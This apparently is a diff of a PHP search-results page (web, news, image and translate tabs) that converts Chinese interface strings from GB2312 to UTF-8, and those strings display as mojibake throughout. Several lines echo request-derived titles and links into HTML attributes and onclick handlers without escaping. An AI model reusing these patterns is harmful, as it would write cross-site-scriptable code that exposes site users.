+        								echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=20&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>æœ«é¡µ</a> ";
                 				?>
                 				<input class='input' border="0" name="page" id="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?> >
 												<input type="submit"  style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
@@ -8569,7 +10197,7 @@ else{
         </tr>   
 </table>                        
                 <?php 
-                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","ÇëÊäÈëÒª×ªµ½µÄÒ³Êı","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","è¯·è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 } // web if end
                 elseif (strpos($Sources,"News") !== false){ // news if start
                 		$bing_search = new bing_class();
@@ -8582,11 +10210,11 @@ else{
                         ?>      
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                ËÑË÷·¢ÉúÒâÍâ´íÎó£¬ÇëÖØÊÔ£¡
+                æœç´¢å‘ç”Ÿæ„å¤–é”™è¯¯ï¼Œè¯·é‡è¯•ï¼
                 </td>
         </tr>   
 </table>                
@@ -8597,11 +10225,11 @@ else{
                         ?>
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                Î´ËÑË÷µ½ÈÎºÎÊı¾İ£¬ÇëÓÅ»¯¼ìË÷´Ê¡£
+                æœªæœç´¢åˆ°ä»»ä½•æ•°æ®ï¼Œè¯·ä¼˜åŒ–æ£€ç´¢è¯ã€‚
                 </td>
         </tr>   
 </table>                        
@@ -8622,7 +10250,7 @@ else{
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑË÷½á¹û : ¹² <?php  echo $searchresult['totalitem'];?> Ìõ,½öÏÔÊ¾Ç° 1000 Ìõ </td>
+                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœç´¢ç»“æœ : å…± <?php  echo $searchresult['totalitem'];?> æ¡,ä»…æ˜¾ç¤ºå‰ 1000 æ¡ </td>
         </tr>   
                         <?php                       
                         for($i=0; $i <= $searchresult['endid'];$i++){
@@ -8656,7 +10284,7 @@ else{
                                         IF(!is_wap()){
                                         		?>
 																					<audio id="tts<?php echo $i; ?>"></audio>
-                                      		<a id='tts_a_<?php echo $i; ?>' style='<?php if(count($voiceresult[arrmember(split("[-]",$marketstr),"0")])===0){ ?>display:none<?php } ?>' onclick='tts_<?php echo $i; ?>();' target=_blank>ÓïÒô</a> 
+                                      		<a id='tts_a_<?php echo $i; ?>' style='<?php if(count($voiceresult[arrmember(split("[-]",$marketstr),"0")])===0){ ?>display:none<?php } ?>' onclick='tts_<?php echo $i; ?>();' target=_blank>è¯­éŸ³</a> 
 <script>
 function tts_<?php echo $i; ?>()
 {
@@ -8690,15 +10318,15 @@ function tts_<?php echo $i; ?>()
                                       	}
                                       	else{
                                       		?>
-                                      		<a style='<?php if(count($voiceresult[arrmember(split("[-]",$marketstr),"0")])===0){ ?>display:none<?php } ?>' href="<?php echo httppath();?>?api=bing&action=tts&content=<?php echo encodeuri($searchresult[$i]['nodeotitle'].$searchresult[$i]['nodeodescript'].$searchresult[$i]['nodedate']);?>&lang=<?php echo (stripos($marketstr,'ar-')===0)?encodeuri('ar-XA'):encodeuri($marketstr);?>&download=1" target=_blank>ÓïÒô</a> 
+                                      		<a style='<?php if(count($voiceresult[arrmember(split("[-]",$marketstr),"0")])===0){ ?>display:none<?php } ?>' href="<?php echo httppath();?>?api=bing&action=tts&content=<?php echo encodeuri($searchresult[$i]['nodeotitle'].$searchresult[$i]['nodeodescript'].$searchresult[$i]['nodedate']);?>&lang=<?php echo (stripos($marketstr,'ar-')===0)?encodeuri('ar-XA'):encodeuri($marketstr);?>&download=1" target=_blank>è¯­éŸ³</a> 
                                       		<?php
                                       	
                                       	}
                                         ?>
                                         				 
-                                                <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>"  target=_blank><?php  echo formatchar("ËõÂÔ");?></a> 
-																		            <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("ÊÕ²Ø");?></a> 
-                                                <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("ÍøÊÕ");?></a>
+                                                <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>"  target=_blank><?php  echo ("ç¼©ç•¥");?></a> 
+																		            <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo ("æ”¶è—");?></a> 
+                                                <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo ("ç½‘æ”¶");?></a>
                                         </td>   
                                 </tr>
                         </table>                        
@@ -8713,16 +10341,16 @@ function tts_<?php echo $i; ?>()
 
                         
                         ?>
-                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ¹² <?php echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> å…± <?php echo $totalpage;?> é¡µ ç¬¬  
                         <?php 
-                        echo $page." Ò³".$sCrlf.' ';
-                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>Ê×Ò³</a> ";
+                        echo $page." é¡µ".$sCrlf.' ';
+                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>é¦–é¡µ</a> ";
                        
                         if (floor($page) > 1)
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÉÏÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸Šä¸€é¡µ</a> ";
                         if (floor($page) > 0 && floor($page) < floor($totalpage))
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÏÂÒ»Ò³</a> ";
-                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=67&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>Ä©Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸‹ä¸€é¡µ</a> ";
+                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=67&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>æœ«é¡µ</a> ";
         
                 				?>
                 				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
@@ -8735,7 +10363,7 @@ function tts_<?php echo $i; ?>()
         </tr>   
 </table>                        
                 <?php 
-                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","ÇëÊäÈëÒª×ªµ½µÄÒ³Êı","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","è¯·è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 } // web if end
                 elseif (strpos($Sources,"Image") !== false){ // news if start
                 	if(trim(request('act'))=='imageview'){
@@ -8750,11 +10378,11 @@ function tts_<?php echo $i; ?>()
                         ?>      
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                ËÑË÷·¢ÉúÒâÍâ´íÎó£¬ÇëÖØÊÔ£¡
+                æœç´¢å‘ç”Ÿæ„å¤–é”™è¯¯ï¼Œè¯·é‡è¯•ï¼
                 </td>
         </tr>   
 </table>                
@@ -8765,11 +10393,11 @@ function tts_<?php echo $i; ?>()
                         ?>
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                Î´ËÑË÷µ½ÈÎºÎÊı¾İ£¬ÇëÓÅ»¯¼ìË÷´Ê¡£
+                æœªæœç´¢åˆ°ä»»ä½•æ•°æ®ï¼Œè¯·ä¼˜åŒ–æ£€ç´¢è¯ã€‚
                 </td>
         </tr>   
 </table>                        
@@ -8794,9 +10422,9 @@ function tts_<?php echo $i; ?>()
 <script src="http://open.web.meitu.com/sources/xiuxiu.js" type="text/javascript"></script>
 <script type="text/javascript">
 window.onload=function(){
-       /*µÚ1¸ö²ÎÊıÊÇ¼ÓÔØ±à¼­Æ÷divÈİÆ÷£¬µÚ2¸ö²ÎÊıÊÇ±à¼­Æ÷ÀàĞÍ£¬µÚ3¸ö²ÎÊıÊÇdivÈİÆ÷¿í£¬µÚ4¸ö²ÎÊıÊÇdivÈİÆ÷¸ß*/
+       /*ç¬¬1ä¸ªå‚æ•°æ˜¯åŠ è½½ç¼–è¾‘å™¨divå®¹å™¨ï¼Œç¬¬2ä¸ªå‚æ•°æ˜¯ç¼–è¾‘å™¨ç±»å‹ï¼Œç¬¬3ä¸ªå‚æ•°æ˜¯divå®¹å™¨å®½ï¼Œç¬¬4ä¸ªå‚æ•°æ˜¯divå®¹å™¨é«˜*/
 	xiuxiu.embedSWF("altContent",3,"100%","100%");
-       //ĞŞ¸ÄÎªÄú×Ô¼ºµÄÍ¼Æ¬ÉÏ´«½Ó¿Ú
+       //ä¿®æ”¹ä¸ºæ‚¨è‡ªå·±çš„å›¾ç‰‡ä¸Šä¼ æ¥å£
 	xiuxiu.setUploadURL("http://web.upload.meitu.com/image_upload.php");
         xiuxiu.setUploadType(2);
         xiuxiu.setUploadDataFieldName("upload_file");
@@ -8806,13 +10434,13 @@ window.onload=function(){
 	}	
 	xiuxiu.onUploadResponse = function (data)
 	{
-		//alert("ÉÏ´«ÏìÓ¦" + data);  ¿ÉÒÔ¿ªÆôµ÷ÊÔ
+		//alert("ä¸Šä¼ å“åº”" + data);  å¯ä»¥å¼€å¯è°ƒè¯•
 	}
 }
 </script>
 
 <div id="altContent">
-	<h1>ÃÀÍ¼ĞãĞã</h1>
+	<h1>ç¾å›¾ç§€ç§€</h1>
 </div>  
 
 </td>
@@ -8945,16 +10573,16 @@ window.onload=function(){
 
                         
                         ?>
-                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ¹² <?php echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> å…± <?php echo $totalpage;?> é¡µ ç¬¬  
                         <?php 
-                        echo $page." Ò³".$sCrlf.' ';
-                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=1&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>Ê×Ò³</a> ";
+                        echo $page." é¡µ".$sCrlf.' ';
+                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=1&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>é¦–é¡µ</a> ";
                        
                         if (floor($page) > 1)
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=".encodeuri($page-1)."&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>ÉÏÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=".encodeuri($page-1)."&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>ä¸Šä¸€é¡µ</a> ";
                         if (floor($page) > 0 && floor($page) < floor($totalpage))
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=".encodeuri($page+1)."&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>ÏÂÒ»Ò³</a> ";
-                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=67&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>Ä©Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=".encodeuri($page+1)."&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>ä¸‹ä¸€é¡µ</a> ";
+                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&ppage=".$ppage."&poffset=".$poffset."&page=67&offset=0&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&act=imageview'>æœ«é¡µ</a> ";
         
                 				?>
                 				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
@@ -8982,11 +10610,11 @@ window.onload=function(){
                         ?>      
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                ËÑË÷·¢ÉúÒâÍâ´íÎó£¬ÇëÖØÊÔ£¡
+                æœç´¢å‘ç”Ÿæ„å¤–é”™è¯¯ï¼Œè¯·é‡è¯•ï¼
                 </td>
         </tr>   
 </table>                
@@ -8997,11 +10625,11 @@ window.onload=function(){
                         ?>
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                Î´ËÑË÷µ½ÈÎºÎÊı¾İ£¬ÇëÓÅ»¯¼ìË÷´Ê¡£
+                æœªæœç´¢åˆ°ä»»ä½•æ•°æ®ï¼Œè¯·ä¼˜åŒ–æ£€ç´¢è¯ã€‚
                 </td>
         </tr>   
 </table>                        
@@ -9022,7 +10650,7 @@ window.onload=function(){
 
 <table width="95%" align="center" cellspacing="" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="<?php echo trim(request('imagelist'))=='list'?'3':'5';?>" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑË÷½á¹û : ¹² <?php  echo $searchresult['totalitem'];?> Ìõ,½öÏÔÊ¾Ç° 1000 Ìõ </td>
+                <td align="center" colspan="<?php echo trim(request('imagelist'))=='list'?'3':'5';?>" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœç´¢ç»“æœ : å…± <?php  echo $searchresult['totalitem'];?> æ¡,ä»…æ˜¾ç¤ºå‰ 1000 æ¡ </td>
         </tr>   
                   
 												<?php                       
@@ -9059,9 +10687,9 @@ window.onload=function(){
                         <table width="95%">
                                 <tr>
                                         <td align="center">
-                                                <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>"  target=_blank><?php  echo formatchar("ËõÂÔ");?></a> 
-																		            <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("ÊÕ²Ø");?></a> 
-                                                <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("ÍøÊÕ");?></a>
+                                                <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>"  target=_blank><?php  echo ("ç¼©ç•¥");?></a> 
+																		            <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo ("æ”¶è—");?></a> 
+                                                <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo ("ç½‘æ”¶");?></a>
                                         </td>   
                                 </tr>
                         </table>                        
@@ -9110,16 +10738,16 @@ window.onload=function(){
 
                         
                         ?>
-                <td align="center" colspan="3" style="<?php $i%4==3?$style->selcolor($skincolor,'tdtbg'):'';?>"> ¹² <?php echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3" style="<?php $i%4==3?$style->selcolor($skincolor,'tdtbg'):'';?>"> å…± <?php echo $totalpage;?> é¡µ ç¬¬  
                         <?php 
-                        echo $page." Ò³".$sCrlf.' ';
-                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>Ê×Ò³</a> ";
+                        echo $page." é¡µ".$sCrlf.' ';
+                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>é¦–é¡µ</a> ";
                        
                         if (floor($page) > 1)
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÉÏÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸Šä¸€é¡µ</a> ";
                         if (floor($page) > 0 && floor($page) < floor($totalpage))
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÏÂÒ»Ò³</a> ";
-                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=67&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>Ä©Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸‹ä¸€é¡µ</a> ";
+                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=67&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>æœ«é¡µ</a> ";
         
                 				?>
                 				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
@@ -9133,7 +10761,7 @@ window.onload=function(){
 </table>                        
                 <?php 
                 	}
-                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","ÇëÊäÈëÒª×ªµ½µÄÒ³Êı","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","è¯·è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 } // image if end
                 elseif (strpos($Sources,"Translate") !== false){ // web if start
  
@@ -9150,11 +10778,11 @@ window.onload=function(){
                         ?>      
 <table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg" height="30">
-                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg" height="30" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                 <td align="center" id="result">
-                ËÑË÷·¢ÉúÒâÍâ´íÎó£¬ÇëÖØÊÔ£¡
+                æœç´¢å‘ç”Ÿæ„å¤–é”™è¯¯ï¼Œè¯·é‡è¯•ï¼
                 </td>
         </tr>   
 </table>                
@@ -9165,11 +10793,11 @@ window.onload=function(){
                         ?>
 <table width="95%" height="50" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg" height="30" >
-                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg" height="30"  style="<?php $style->selcolor($skincolor,'tdbg');?>">
                 <td align="center" id="result">
-                Î´ËÑË÷µ½ÈÎºÎÊı¾İ£¬ÇëÓÅ»¯¼ìË÷´Ê¡£
+                æœªæœç´¢åˆ°ä»»ä½•æ•°æ®ï¼Œè¯·ä¼˜åŒ–æ£€ç´¢è¯ã€‚
                 </td>
         </tr>   
 </table>                        
@@ -9189,7 +10817,7 @@ window.onload=function(){
                         ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > ËÑË÷½á¹û : ¹² <?php  echo $totalitem;?> Ìõ,½öÏÔÊ¾Ç° 1000 Ìõ </td>
+                <td align="center" colspan="3" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > æœç´¢ç»“æœ : å…± <?php  echo $totalitem;?> æ¡,ä»…æ˜¾ç¤ºå‰ 1000 æ¡ </td>
         </tr>   
                         <?php        
 												$page=min(ceil(count($lang)/$pagesize),$page);                              
@@ -9227,7 +10855,7 @@ window.onload=function(){
                                         IF(!is_wap()){
                                         		?>
 																					<audio id="tts<?php echo $i; ?>"></audio>
-                                      		<a id='tts_a_<?php echo $i; ?>' style='<?php if($searchresult[$i]['nodeotext']==""||(!$voiceresult[$langstr])){ ?>display:none<?php } ?>' onclick='tts_<?php echo $i; ?>();' target=_blank>ÓïÒô</a> 
+                                      		<a id='tts_a_<?php echo $i; ?>' style='<?php if($searchresult[$i]['nodeotext']==""||(!$voiceresult[$langstr])){ ?>display:none<?php } ?>' onclick='tts_<?php echo $i; ?>();' target=_blank>è¯­éŸ³</a> 
 <script>
 function tts_<?php echo $i; ?>()
 {
